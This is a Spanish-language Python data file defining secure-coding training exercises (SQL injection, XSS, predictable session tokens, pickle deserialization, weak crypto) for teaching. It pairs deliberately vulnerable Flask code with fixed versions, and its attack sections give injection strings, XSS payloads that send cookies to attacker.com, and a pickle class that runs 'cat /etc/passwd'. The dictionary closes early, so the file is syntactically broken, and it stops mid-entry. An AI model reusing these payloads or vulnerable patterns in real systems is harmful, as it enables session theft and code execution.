"""
EJERCICIOS FUNCIONALES DE SECURE CODING DOJO
Ejercicios con vulnerabilidades reales simuladas y educación progresiva
"""

COMPLETE_EXERCISES = {
    # ==================== 1. SQL INJECTION ====================
    "1_sql_injection_login": {
        "id": "1_sql_injection_login",
        "title": "SQL Injection en Sistema de Login",
        "short_title": "SQL Injection",
        "description": "Aprende cómo funciona SQL Injection explotando un sistema de login vulnerable.",
        "difficulty": "BEGINNER",
        "vulnerability_type": "SQL_INJECTION",
        "attack_type": "INJECTION",
        "icon": "🔓",
        "color": "red",
        "cvss_score": 9.8,
        "owasp_top_10": "A03:2021",
        "cwe_id": "CWE-89",
        "cwe_description": "Improper Neutralization of Special Elements used in an SQL Command",
        
        "vulnerability_explanation": """
        SQL Injection es una vulnerabilidad que permite a un atacante alterar queries SQL enviadas a la base de datos.
        
        La vulnerabilidad ocurre cuando:
        1. La aplicación acepta entrada del usuario
        2. NO valida o sanitiza la entrada
        3. Concatena la entrada directamente en una query SQL
        4. Ejecuta la query sin parametrización
        
        En este ejercicio, un sistema de login concatena directamente el usuario y contraseña en la query:
        SELECT * FROM users WHERE username='$username' AND password='$password'
        
        Un atacante puede ingresar: admin' --
        Resultando en: SELECT * FROM users WHERE username='admin' --' AND password='...'
        
        El comentario SQL (--) ignora el resto de la query, permitiendo login sin contraseña.
        """,
        
        "attack_explanation": """
        ¿CÓMO FUNCIONA EL ATAQUE?
        
        1. El atacante analiza el formulario de login
        2. Identifica que no hay validación de entrada
        3. Ingresa: admin' --
        4. La query resultante se convierte en:
           SELECT * FROM users WHERE username='admin' --' AND password=''
        5. Los caracteres -- comentan el resto de la query
        6. La base de datos retorna el usuario 'admin' sin verificar contraseña
        7. El atacante logra acceso sin conocer la contraseña
        
        VARIACIONES DE ATAQUE:
        - ' OR '1'='1' -- Retorna todos los usuarios
        - ' OR '1'='1 Bypass de validación
        - '; DROP TABLE users; -- Destruye la tabla
        - UNION SELECT... Extrae datos de otras tablas
        """,
        
        "real_world_impact": """
        IMPACTO EN EL MUNDO REAL:
        
        ⚠️ Compromiso total de la base de datos
        - Extracción de datos sensibles (credenciales, información personal)
        - Modificación o eliminación de registros
        - Escalación de privilegios
        - Acceso a tablas no autorizadas
        
        💰 Casos históricos:
        - TalkTalk (2015): Pérdida de datos de 4 millones de clientes
        - LinkedIn (2012): 6.5 millones de contraseñas comprometidas
        - Sony (2014): Influencia en hackeos de datos masivos
        """,
        
        "countermeasures": """
        CONTRAMEDIDAS EFECTIVAS:
        
        1. PREPARED STATEMENTS (Más importante)
           cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
           
        2. PARAMETRIZED QUERIES
           cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
           
        3. VALIDACIÓN DE ENTRADA
           - Whitelist de caracteres permitidos
           - Longitud máxima de input
           - Tipo de dato esperado
           
        4. ESCAPADO DE CARACTERES ESPECIALES
           - Si no puedes usar prepared statements
           - Escapa caracteres como ', ", ;, --
           
        5. PRINCIPIO DE MENOR PRIVILEGIO
           - Usuario de base de datos solo con permisos necesarios
           - No ejecutar queries como admin
           
        6. WAF (Web Application Firewall)
           - Detectar y bloquear patrones de SQL Injection
           - Monitoreo de queries anormales
        """,
        
        "best_practices": """
        MEJORES PRÁCTICAS:
        
        ✅ Siempre usar prepared statements
        ✅ Nunca confíes en entrada del usuario
        ✅ Implementar validación robusta
        ✅ Usar ORM cuando sea posible
        ✅ Aplicar principio de menor privilegio
        ✅ Implementar rate limiting en login
        ✅ Usar WAF para detección adicional
        ✅ Realizar pruebas de seguridad regulares
        """,
        
        "learning_objectives": [
            "Entender cómo funciona SQL Injection",
            "Identificar código vulnerable",
            "Aplicar prepared statements",
            "Implementar validación segura",
            "Analizar impacto de vulnerabilidades"
        ],
        
        "vulnerable_code": """
# CÓDIGO VULNERABLE - NO USAR EN PRODUCCIÓN
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login_vulnerable():
    username = request.form.get('username')
    password = request.form.get('password')
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # ❌ VULNERABLE: Concatenación directa
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    
    user = cursor.fetchone()
    if user:
        return "Login successful!"
    return "Login failed!"
""",
        
        "vulnerable_code_language": "python",
        
        "vulnerable_code_explanation": """
        El problema en este código:
        - Usa f-string para concatenar entrada del usuario
        - No valida ni sanitiza el input
        - No usa prepared statements
        - La contraseña se maneja de forma insegura
        - Permite múltiples ataques de SQL Injection
        """,
        
        "secure_code": """
# CÓDIGO SEGURO - USAR COMO REFERENCIA
from flask import Flask, request
import sqlite3
from werkzeug.security import check_password_hash

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login_secure():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '')
    
    # ✅ VALIDACIÓN: Verifica que no estén vacíos
    if not username or not password:
        return "Username and password required", 400
    
    # ✅ VALIDACIÓN: Longitud razonable
    if len(username) > 50 or len(password) > 100:
        return "Invalid input length", 400
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # ✅ SEGURO: Usa ? para prepared statement
    cursor.execute(
        "SELECT id, password_hash FROM users WHERE username = ?",
        (username,)
    )
    
    user = cursor.fetchone()
    
    # ✅ SEGURO: Verifica contraseña hasheada
    if user and check_password_hash(user[1], password):
        return "Login successful!"
    
    return "Invalid username or password", 401
""",
        
        "secure_code_language": "python",
        
        "secure_code_explanation": """
        Mejoras de seguridad implementadas:
        1. Prepared statements con ? placeholders
        2. Validación de entrada (no vacío, longitud)
        3. Separación de consulta y datos
        4. Uso de password hashing (check_password_hash)
        5. Mensajes de error genéricos (no revela si usuario existe)
        6. Manejo seguro de excepciones
        """,
        
        "hint_1": "Piensa en cómo el símbolo ' puede cerrar la cadena de la query SQL.",
        
        "hint_2": "Los comentarios SQL como -- pueden ignorar el resto de la query. ¿Qué pasaría si usas ' seguido de comentario?",
        
        "hint_3": "Intenta ingresar: admin' -- (sin comillas finales). El comentario -- ignora la validación de contraseña.",
        
        "test_endpoint": "/api/exercises/1/test",
        "test_payload": "admin' --",
        "expected_result": "Login successful without password",
        
        "references": [
            "OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection",
            "CWE-89: https://cwe.mitre.org/data/definitions/89.html",
            "PortSwigger SQL Injection: https://portswigger.net/web-security/sql-injection"
        ]
    },
    
    # ==================== 2. CROSS-SITE SCRIPTING (XSS) ====================
    "2_xss_comment_section": {
        "id": "2_xss_comment_section",
        "title": "Cross-Site Scripting en Sección de Comentarios",
        "short_title": "Cross-Site Scripting (XSS)",
        "description": "Inyecta JavaScript en comentarios y comprende cómo afecta a otros usuarios.",
        "difficulty": "BEGINNER",
        "vulnerability_type": "XSS",
        "attack_type": "CROSS_SITE",
        "icon": "🔗",
        "color": "orange",
        "cvss_score": 8.2,
        "owasp_top_10": "A03:2021",
        "cwe_id": "CWE-79",
        "cwe_description": "Improper Neutralization of Input During Web Page Generation",
        
        "vulnerability_explanation": """
        XSS (Cross-Site Scripting) es una vulnerabilidad que permite inyectar código JavaScript malicioso
        en páginas web que otros usuarios visitarán.
        
        La vulnerabilidad ocurre cuando:
        1. La aplicación acepta entrada del usuario (formularios, URLs, etc.)
        2. NO sanitiza o escapa el contenido
        3. Renderiza la entrada directamente en HTML
        4. El navegador ejecuta el JavaScript inyectado
        
        TIPOS DE XSS:
        
        1. XSS REFLEJADO (Reflected XSS)
           - El payload se incluye en la URL o petición
           - Afecta solo al usuario que hace clic en el link malicioso
           - Más fácil de explotar
           
        2. XSS ALMACENADO (Stored XSS)
           - El payload se guarda en la base de datos
           - Afecta a TODOS los usuarios que ven el contenido
           - Más peligroso
           
        En este ejercicio, los comentarios no se escapan, permitiendo XSS almacenado.
        """,
        
        "attack_explanation": """
        ¿CÓMO FUNCIONA UN ATAQUE XSS?
        
        1. Atacante ingresa un comentario con código JavaScript
           <img src=x onerror="alert('XSS')">
           
        2. La aplicación guarda el comentario directamente en la BD
        3. Otros usuarios ven el comentario
        4. El navegador renderiza el HTML
        5. Se ejecuta el JavaScript automáticamente
        
        PAYLOADS PELIGROSOS:
        
        - <script>alert('XSS')</script>
        - <img src=x onerror="fetch('http://attacker.com/steal?data='+document.cookie)">
        - <svg/onload=fetch('/api/admin',{method:'POST',body:data})>
        - <body onload="new Image().src='http://attacker.com/log?user='+document.cookie">
        
        ROBO DE COOKIES (Tokens de sesión):
        const img = new Image();
        img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
        
        Con la cookie del usuario, el atacante puede:
        - Suplantar identidad del usuario
        - Acceder a cuentas
        - Realizar acciones en nombre del usuario
        """,
        
        "real_world_impact": """
        IMPACTO EN EL MUNDO REAL:
        
        ⚠️ Robo de sesiones y credenciales
        - Captura de cookies y tokens
        - Suplantación de identidad
        - Acceso a información personal
        
        ⚠️ Malware y Phishing
        - Inyección de formularios falsos
        - Redirección a sitios maliciosos
        - Descarga de malware
        
        ⚠️ Modificación de contenido
        - Cambio de información en página
        - Defacement
        - Propagación de contenido falso
        
        💰 Casos históricos:
        - Twitter (2020): Hack de cuentas verificadas mediante XSS
        - Facebook (2013): Vulnerabilidad XSS permitía acceso a fotos privadas
        - MySpace: Gusano Samy (2005): Se propagó a 1 millón de usuarios
        """,
        
        "countermeasures": """
        CONTRAMEDIDAS EFECTIVAS:
        
        1. ESCAPAR OUTPUT (Context-aware escaping)
           HTML Escaping: <, >, &, ", '
           JavaScript Escaping: Para atributos
           URL Encoding: Para URLs
           
        2. USAR TEMPLATING SEGURO
           - React escapa por defecto
           - Vue.js escapa interpolación
           - Twig, Jinja2, etc. tienen escaping automático
           
        3. CONTENT SECURITY POLICY (CSP)
           <meta http-equiv="Content-Security-Policy" 
                 content="script-src 'self'">
           
        4. VALIDACIÓN DE ENTRADA
           - Whitelist de caracteres permitidos
           - Tipo de dato esperado
           - Longitud máxima
           
        5. USAR LIBRERÍAS DE SANITIZACIÓN
           DOMPurify para navegadores
           bleach para Python
           
        6. HTTP HEADERS DE SEGURIDAD
           X-XSS-Protection: 1; mode=block
           X-Content-Type-Options: nosniff
        """,
        
        "best_practices": """
        MEJORES PRÁCTICAS:
        
        ✅ Siempre escapar output
        ✅ Usar frameworks con protección XSS integrada
        ✅ Implementar CSP
        ✅ Validar entrada (aunque no sea suficiente)
        ✅ Sanitizar contenido HTML si es necesario
        ✅ Usar librerías probadas
        ✅ Aplicar principio de menor privilegio
        ✅ Educar sobre riesgos de XSS
        """,
        
        "learning_objectives": [
            "Entender tipos de XSS",
            "Identificar inyecciones de JavaScript",
            "Implementar escaping correcto",
            "Usar Content Security Policy",
            "Sanitizar HTML de forma segura"
        ],
        
        "vulnerable_code": """
# CÓDIGO VULNERABLE - FLASK + HTML
from flask import Flask, request, render_template_string
import sqlite3

app = Flask(__name__)

@app.route('/add-comment', methods=['POST'])
def add_comment_vulnerable():
    comment = request.form.get('comment')
    
    conn = sqlite3.connect('comments.db')
    cursor = conn.cursor()
    
    # ❌ VULNERABLE: Guarda sin sanitizar
    cursor.execute("INSERT INTO comments (content) VALUES (?)", (comment,))
    conn.commit()
    
    return "Comment added!"

@app.route('/view-comments')
def view_comments_vulnerable():
    conn = sqlite3.connect('comments.db')
    cursor = conn.cursor()
    cursor.execute("SELECT content FROM comments")
    comments = cursor.fetchall()
    
    # ❌ VULNERABLE: Renderiza sin escapar
    html = "<div>"
    for comment in comments:
        html += f"<p>{comment[0]}</p>"  # SIN ESCAPAR
    html += "</div>"
    
    return html
""",
        
        "vulnerable_code_language": "python",
        
        "vulnerable_code_explanation": """
        Problemas en este código:
        - Los comentarios se renderizen sin escapar
        - HTML se concatena directamente
        - No hay sanitización
        - JavaScript se ejecuta automáticamente
        """,
        
        "secure_code": """
# CÓDIGO SEGURO
from flask import Flask, request, render_template
import sqlite3
from markupsafe import escape
import bleach

app = Flask(__name__)

ALLOWED_TAGS = ['b', 'i', 'u', 'p', 'br']  # Solo etiquetas seguras

@app.route('/add-comment', methods=['POST'])
def add_comment_secure():
    comment = request.form.get('comment', '').strip()
    
    # ✅ VALIDACIÓN: No vacío
    if not comment:
        return "Comment cannot be empty", 400
    
    # ✅ SANITIZACIÓN: Permite solo etiquetas seguras
    comment_clean = bleach.clean(comment, tags=ALLOWED_TAGS, strip=True)
    
    conn = sqlite3.connect('comments.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO comments (content) VALUES (?)", (comment_clean,))
    conn.commit()
    
    return "Comment added!"

@app.route('/view-comments')
def view_comments_secure():
    conn = sqlite3.connect('comments.db')
    cursor = conn.cursor()
    cursor.execute("SELECT content FROM comments")
    comments = cursor.fetchall()
    
    # Usa render_template que escapa automáticamente
    return render_template('comments.html', comments=comments)

# EN TEMPLATE (comments.html):
# {% for comment in comments %}
#     <p>{{ comment|escape }}</p>  ✅ Escapa automáticamente
# {% endfor %}
""",
        
        "secure_code_language": "python",
        
        "secure_code_explanation": """
        Mejoras de seguridad:
        1. Sanitización con bleach (solo etiquetas seguras)
        2. Validación de entrada
        3. Uso de templates que escapan por defecto
        4. Separación de lógica y presentación
        """,
        
        "hint_1": "Los navegadores ejecutan código HTML. ¿Qué etiqueta HTML permite ejecutar JavaScript?",
        
        "hint_2": "La etiqueta <img> tiene un atributo 'onerror' que ejecuta JavaScript cuando la imagen no se carga.",
        
        "hint_3": "Intenta ingresar: <img src=x onerror=\"alert('XSS Vulnerable!')\">\nEste payload provocará una alerta si el comentario no se escapa.",
        
        "test_endpoint": "/api/exercises/2/test",
        "test_payload": "<img src=x onerror=\"alert('XSS')\">",
        "expected_result": "JavaScript executed",
        
        "references": [
            "OWASP XSS: https://owasp.org/www-community/attacks/xss/",
            "CWE-79: https://cwe.mitre.org/data/definitions/79.html",
            "PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting"
        ]
    },
    
    # ==================== 3. BROKEN AUTHENTICATION ====================
    "3_broken_authentication_weak_session": {
        "id": "3_broken_authentication_weak_session",
        "title": "Autenticación Débil - Manejo Inseguro de Sesiones",
        "short_title": "Broken Authentication",
        "description": "Explota fallos en la gestión de sesiones y tokens.",
        "difficulty": "INTERMEDIATE",
        "vulnerability_type": "BROKEN_AUTH",
        "attack_type": "AUTHENTICATION",
        "icon": "🔐",
        "color": "purple",
        "cvss_score": 8.5,
        "owasp_top_10": "A07:2021",
        "cwe_id": "CWE-287",
        "cwe_description": "Improper Authentication",
        
        "vulnerability_explanation": """
        Broken Authentication ocurre cuando los mecanismos de autenticación son débiles o están mal implementados.
        
        TIPOS COMUNES:
        
        1. SESSION TOKENS PREDECIBLES
           - Tokens secuenciales
           - Tokens basados en información pública
           - Tokens con entropía insuficiente
           
        2. FALTA DE ROTACIÓN DE SESIÓN
           - La misma sesión se reutiliza
           - No se invalida al logout
           - Se pueden secuestrar sesiones
           
        3. CREDENCIALES DÉBILES
           - Contraseñas cortas
           - Sin requisitos de complejidad
           - Reutilización de contraseñas
           
        4. FALTA DE RATE LIMITING
           - Ataques de fuerza bruta posibles
           - Enumeración de usuarios
           
        En este ejercicio, los tokens de sesión son predecibles y fáciles de falsificar.
        """,
        
        "attack_explanation": """
        ¿CÓMO FUNCIONA EL ATAQUE?
        
        1. El atacante se registra con su cuenta
        2. Obtiene su token de sesión: "user_123_001"
        3. Identifica el patrón: "user_{user_id}_{secuencia}"
        4. Para acceder a otro usuario (ID 456), prueba: "user_456_001"
        5. Si funciona, el atacante accede sin credenciales
        
        PATRONES PREDECIBLES:
        - user_1, user_2, user_3 (Secuencial)
        - timestamp sin suficiente precisión
        - MD5(username) fácil de invertir
        - Base64 de información conocida
        
        ATAQUE DE SESSION FIXATION:
        1. Atacante crea sesión maliciosa
        2. Envía link al usuario: site.com?session=attacker_token
        3. Usuario acepta la sesión
        4. Atacante usa ese mismo token
        5. Accede a la sesión del usuario
        """,
        
        "real_world_impact": """
        IMPACTO EN EL MUNDO REAL:
        
        ⚠️ Acceso no autorizado a cuentas
        - Usurpación de identidad
        - Robo de datos personales
        - Transacciones fraudulentas
        
        ⚠️ Secuestro de cuentas (Account Takeover)
        - Control total de cuenta
        - Cambio de contraseña
        - Modificación de datos
        
        ⚠️ Escalación de privilegios
        - Acceso a cuentas administrativas
        - Modificación de sistema
        
        💰 Casos históricos:
        - Yahoo (2013): Compromiso de 3 mil millones de cuentas
        - Target (2013): Breach de datos de clientes
        - Equifax (2017): Exposición de datos de 147 millones de personas
        """,
        
        "countermeasures": """
        CONTRAMEDIDAS EFECTIVAS:
        
        1. USAR TOKENS SEGUROS Y ÚNICOS
           - Mínimo 128 bits de entropía
           - Generados criptográficamente
           - Imposibles de predecir
           
           import secrets
           token = secrets.token_urlsafe(32)
           
        2. ROTACIÓN DE SESIÓN
           - Nueva sesión después de login
           - Nueva sesión después de logout
           - Nueva sesión en cambio de privilegios
           
        3. VALIDACIÓN ROBUSTA
           - Verificar navegador (User-Agent)
           - Verificar IP del cliente
           - Verificar timestamp de sesión
           
        4. RATE LIMITING Y THROTTLING
           - Máx 5 intentos de login por minuto
           - Incrementar espera entre intentos
           - Bloqueo temporal después de fallos
           
        5. AUTENTICACIÓN MULTI-FACTOR (MFA)
           - Segundo factor requerido
           - Reduce riesgo incluso si contraseña comprometida
           
        6. USAR JWT FIRMADOS
           - JSON Web Tokens con firma
           - Verificar firma en cada solicitud
           - Incluir expiración
           
           header.payload.signature
        """,
        
        "best_practices": """
        MEJORES PRÁCTICAS:
        
        ✅ Generar tokens con cryptographic RNG
        ✅ Implementar expiración de sesiones
        ✅ Rotar sesiones después de login
        ✅ Usar HTTPS para transmisión
        ✅ Almacenar sesiones server-side
        ✅ Implementar rate limiting
        ✅ Habilitar MFA
        ✅ Usar librerías establecidas (OAuth2, JWT)
        """,
        
        "learning_objectives": [
            "Entender fallos de autenticación",
            "Identificar tokens predecibles",
            "Implementar sesiones seguras",
            "Usar JWT correctamente",
            "Implementar MFA"
        ],
        
        "vulnerable_code": """
# CÓDIGO VULNERABLE
from flask import Flask, request, make_response
import sqlite3
from datetime import datetime

app = Flask(__name__)

user_counter = 0  # ❌ VULNERABLE: Contador global predecible

@app.route('/login', methods=['POST'])
def login_vulnerable():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Verificar credenciales
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("SELECT id, password FROM users WHERE username = ?", (username,))
    user = cursor.fetchone()
    
    if user and user[1] == password:  # ❌ Contraseña sin hash
        global user_counter
        user_counter += 1
        
        # ❌ VULNERABLE: Token secuencial predecible
        token = f"user_{user[0]}_{user_counter}"
        
        response = make_response("Login successful")
        response.set_cookie('session', token)
        return response
    
    return "Login failed"

@app.route('/profile')
def profile_vulnerable():
    token = request.cookies.get('session')
    
    # ❌ VULNERABLE: No valida el token, solo lo parse
    parts = token.split('_')
    user_id = parts[1]
    
    # Muestra datos del usuario basado en token predecible
    return f"User {user_id} profile"
""",
        
        "vulnerable_code_language": "python",
        
        "vulnerable_code_explanation": """
        Problemas críticos:
        1. Tokens secuenciales predecibles
        2. Contraseña sin hash (plain text)
        3. No hay validación del token
        4. No hay expiración
        5. No hay rotación de sesión
        """,
        
        "secure_code": """
# CÓDIGO SEGURO
from flask import Flask, request, make_response
import sqlite3
import secrets
import hashlib
from datetime import datetime, timedelta
import jwt

app = Flask(__name__)
SECRET_KEY = 'use-env-variable-in-production'

@app.route('/login', methods=['POST'])
def login_secure():
    username = request.form.get('username')
    password = request.form.get('password')
    
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute(
        "SELECT id, password_hash FROM users WHERE username = ?", 
        (username,)
    )
    user = cursor.fetchone()
    
    if not user:
        return "Invalid credentials", 401
    
    # ✅ SEGURO: Verificar contraseña hasheada
    if not verify_password(password, user[1]):
        return "Invalid credentials", 401
    
    # ✅ SEGURO: Generar token criptográfico único
    token_data = {
        'user_id': user[0],
        'username': username,
        'exp': datetime.utcnow() + timedelta(hours=1),
        'iat': datetime.utcnow(),
        'nonce': secrets.token_hex(16)  # Imposible de predecir
    }
    
    token = jwt.encode(token_data, SECRET_KEY, algorithm='HS256')
    
    response = make_response("Login successful")
    response.set_cookie(
        'session',
        token,
        secure=True,  # HTTPS solo
        httponly=True,  # No accesible desde JS
        samesite='Strict'  # CSRF protection
    )
    return response

@app.route('/profile')
def profile_secure():
    token = request.cookies.get('session')
    
    if not token:
        return "Unauthorized", 401
    
    try:
        # ✅ SEGURO: Verificar y decodificar token
        payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        user_id = payload['user_id']
        
        # Validar que no expiró
        # JWT automáticamente verifica exp
        
        return f"User {user_id} profile (seguro)"
    except jwt.ExpiredSignatureError:
        return "Session expired", 401
    except jwt.InvalidTokenError:
        return "Invalid token", 401

def verify_password(password, hash):
    # Usar bcrypt en producción
    return hashlib.sha256(password.encode()).hexdigest() == hash
""",
        
        "secure_code_language": "python",
        
        "secure_code_explanation": """
        Mejoras de seguridad:
        1. Tokens criptográficamente seguros
        2. Contraseña hasheada (verificación segura)
        3. JWT con firma y verificación
        4. Expiración de sesión
        5. Cookies seguras (HttpOnly, Secure, SameSite)
        6. Nonce único imposible de predecir
        """,
        
        "hint_1": "Los tokens de sesión deberían ser imposibles de adivinar. ¿Ves algún patrón en los tokens?",
        
        "hint_2": "El token tiene la forma: user_123_456. ¿Puedes predecir el siguiente número?",
        
        "hint_3": "Si eres el user_1, tu token es user_1_1. Para ser user_2, prueba cambiar el token a user_2_1.",
        
        "test_endpoint": "/api/exercises/3/test",
        "test_payload": "user_2_1",
        "expected_result": "Session hijacking successful",
        
        "references": [
            "OWASP Authentication: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",
            "CWE-287: https://cwe.mitre.org/data/definitions/287.html",
            "JWT Best Practices: https://tools.ietf.org/html/rfc8725"
        ]
    }
}

    # ==================== 4. INSECURE DESERIALIZATION ====================
    "4_insecure_deserialization": {
        "id": "4_insecure_deserialization",
        "title": "Deserialización Insegura en Caché de Usuario",
        "short_title": "Insecure Deserialization",
        "description": "Explota la deserialización insegura de datos serializados para ejecutar código malicioso.",
        "difficulty": "ADVANCED",
        "vulnerability_type": "INSECURE_DESERIALIZE",
        "attack_type": "SERIALIZATION",
        "icon": "📦",
        "color": "indigo",
        "cvss_score": 9.1,
        "owasp_top_10": "A08:2021",
        "cwe_id": "CWE-502",
        "cwe_description": "Deserialization of Untrusted Data",
        
        "vulnerability_explanation": """
        La Deserialización Insegura ocurre cuando una aplicación deserializa datos no confiables
        sin validar su integridad o autenticidad.
        
        PROBLEMAS PRINCIPALES:
        
        1. EJECUCIÓN DE CÓDIGO ARBITRARIO
           - Un atacante puede incluir código malicioso en datos serializados
           - Al deserializar, ese código se ejecuta automáticamente
           
        2. GADGET CHAINS
           - Existen cadenas de métodos que pueden llevar a RCE
           - Librerías populares tienen gadgets conocidos
           - Herramientas como ysoserial generan payloads
           
        3. FALTA DE VALIDACIÓN
           - No se verifica la fuente de los datos
           - No se valida la estructura
           - No se usa HMAC o firma digital
           
        En este ejercicio, objetos de usuario se serializan sin protección.
        """,
        
        "attack_explanation": """
        ¿CÓMO FUNCIONA EL ATAQUE?
        
        1. Atacante envía datos serializados maliciosos
        2. Aplicación deserializa sin validar
        3. Se ejecutan métodos maliciosos durante deserialización
        4. Se obtiene Remote Code Execution (RCE)
        
        TIPOS DE GADGETS:
        
        Java:
        - commons-collections
        - spring-core
        - rome
        
        Python:
        - pickle
        - yaml (unsafe_load)
        
        Ejemplo con pickle:
        import pickle
        import base64
        malicious = b'cos\\nsystem\\np0\\n(S\"cat /etc/passwd\"\\np1\\nRp2\\n.'
        pickle.loads(base64.b64decode(malicious))
        """,
        
        "real_world_impact": """
        IMPACTO EN EL MUNDO REAL:
        
        ⚠️ Remote Code Execution (RCE) Total
        - Control completo del servidor
        - Instalación de backdoors
        - Robo de datos sensibles
        
        ⚠️ Compromiso de Infraestructura
        - Lateral movement en red
        - Creación de reverse shells
        - Cifrado de datos (ransomware)
        
        💰 Casos históricos:
        - Spring Framework (2016): Gadget chain vulnerability
        - Jenkins (2015): RCE mediante Java deserialization
        - Apache Commons Collections: Múltiples gadgets encontrados
        """,
        
        "countermeasures": """
        CONTRAMEDIDAS EFECTIVAS:
        
        1. EVITAR DESERIALIZACIÓN DE DATOS NO CONFIABLES
           - Usar JSON en lugar de serialización binaria
           - Si es necesario, usar formatos seguros
           
        2. USAR LIBRERÍAS SEGURAS
           - Validación estricta de tipos
           - Whitelist de clases permitidas
           - Deshabilitar gadgets conocidos
           
        3. FIRMAR Y ENCRIPTAR
           - HMAC de los datos serializados
           - Encriptación de los datos
           - Validación de integridad
           
        4. USAR JSON CON VALIDACIÓN ESTRICTA
           import json
           data = json.loads(user_data)  # Más seguro que pickle
           
        5. USAR LIBRERÍAS DE SEGURIDAD
           - marshmallow para serialización segura
           - protobuf para estructuras seguras
           
        6. DESACTIVAR GADGETS PELIGROSOS
           - Monitoreo de deserialización
           - WAF para detectar payloads
        """,
        
        "best_practices": """
        MEJORES PRÁCTICAS:
        
        ✅ Preferir JSON sobre serialización binaria
        ✅ Validar integridad de datos con HMAC
        ✅ Usar whitelists de clases
        ✅ Encriptar datos en tránsito y reposo
        ✅ Actualizar dependencias regularmente
        ✅ Usar herramientas para detectar gadgets
        ✅ Implementar IDS/IPS
        """,
        
        "learning_objectives": [
            "Entender deserialización insegura",
            "Identificar gadget chains",
            "Implementar validación segura",
            "Usar JSON seguro",
            "Firmar datos para integridad"
        ],
        
        "vulnerable_code": """
# CÓDIGO VULNERABLE - Python
import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

@app.route('/load-user', methods=['POST'])
def load_user_vulnerable():
    user_data = request.form.get('data')
    
    # ❌ VULNERABLE: Deserializa directamente
    user = pickle.loads(base64.b64decode(user_data))
    
    # El objeto puede ejecutar código durante deserialización
    return f"User loaded: {user.name}"

# Para crear datos maliciosos:
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd',))

malicious = pickle.dumps(Exploit())
print(base64.b64encode(malicious).decode())
""",
        
        "vulnerable_code_language": "python",
        
        "vulnerable_code_explanation": """
        Problemas críticos:
        1. Usa pickle.loads() en datos no confiables
        2. No valida la estructura del objeto
        3. pickle ejecuta código durante deserialización
        4. No hay HMAC o firma
        """,
        
        "secure_code": """
# CÓDIGO SEGURO
import json
import hmac
import hashlib
from flask import Flask, request

app = Flask(__name__)
SECRET_KEY = b'use-env-variable'

@app.route('/load-user', methods=['POST'])
def load_user_secure():
    user_json = request.form.get('data')
    user_hmac = request.form.get('hmac')
    
    # ✅ SEGURO: Validar HMAC
    expected_hmac = hmac.new(SECRET_KEY, user_json.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(user_hmac, expected_hmac):
        return "Invalid HMAC", 401
    
    # ✅ SEGURO: Usar JSON (no ejecuta código)
    user_data = json.loads(user_json)
    
    # ✅ SEGURO: Validar estructura y tipos
    if not isinstance(user_data, dict):
        return "Invalid data format", 400
    
    required_fields = ['name', 'email']
    for field in required_fields:
        if field not in user_data or not isinstance(user_data[field], str):
            return f"Invalid field: {field}", 400
    
    return f"User loaded securely: {user_data['name']}"

# Para crear datos seguros:
import hmac
import hashlib

user = {'name': 'John', 'email': 'john@example.com'}
user_json = json.dumps(user)
user_hmac = hmac.new(SECRET_KEY, user_json.encode(), hashlib.sha256).hexdigest()
print(f"Data: {user_json}")
print(f"HMAC: {user_hmac}")
""",
        
        "secure_code_language": "python",
        
        "secure_code_explanation": """
        Mejoras de seguridad:
        1. Usa JSON en lugar de pickle
        2. Valida HMAC para integridad
        3. Valida estructura y tipos de datos
        4. No ejecuta código durante deserialization
        """,
        
        "hint_1": "¿Qué formato de serialización es más seguro que pickle?",
        
        "hint_2": "Los datos deserializados deben ser validados. ¿Cómo verificas que no fueron modificados?",
        
        "hint_3": "Usa pickle con código malicioso. Intenta una clase que ejecute comandos del sistema.",
        
        "test_endpoint": "/api/exercises/4/test",
        "test_payload": "base64_encoded_pickle_payload",
        "expected_result": "Code execution detected",
        
        "references": [
            "OWASP Deserialization: https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data",
            "CWE-502: https://cwe.mitre.org/data/definitions/502.html",
            "ysoserial: https://github.com/frohoff/ysoserial"
        ]
    },
    
    # ==================== 5. INSECURE CRYPTOGRAPHY ====================
    "5_weak_encryption": {
        "id": "5_weak_encryption",
        "title": "Criptografía Débil - Algoritmos Inseguros",
        "short_title": "Insecure Cryptography",
        "description": "Aprende por qué algunos algoritmos criptográficos son débiles y cómo atacarlos.",
        "difficulty": "ADVANCED",
        "vulnerability_type": "INSECURE_CRYPTOGRAPHY",
        "attack_type": "CRYPTO",
        "icon": "🔑",
        "color": "pink",
        "cvss_score": 7.5,
        "owasp_top_10": "A02:2021",
        "cwe_id": "CWE-327",
        "cwe_description": "Use of a Broken or Risky Cryptographic Algorithm",
        
        "vulnerability_explanation": """
        Criptografía Débil ocurre cuando se usan algoritmos o longitudes de clave insuficientes.
        
        ALGORITMOS DÉBILES:
        
        1. MD5
           - Colisiones comprobadas
           - No debe usarse para hashing
           - Se puede precomputar hashes
           
        2. SHA-1
           - Colisiones teóricas demostradas
           - Deprecado por NIST
           - No seguro para nuevas aplicaciones
           
        3. DES
           - Solo 56 bits de clave
           - Se puede romper por fuerza bruta
           - Inaceptable para datos modernos
           
        4. ECB (Electronic Codebook)
           - No añade aleatoriedad
           - Patrones visibles en texto cifrado
           - No seguro para más de 64 bits
           
        5. CONTRASEÑAS SIN SALT
           - Rainbow tables funcionan
           - Múltiples usuarios con misma contraseña tienen mismo hash
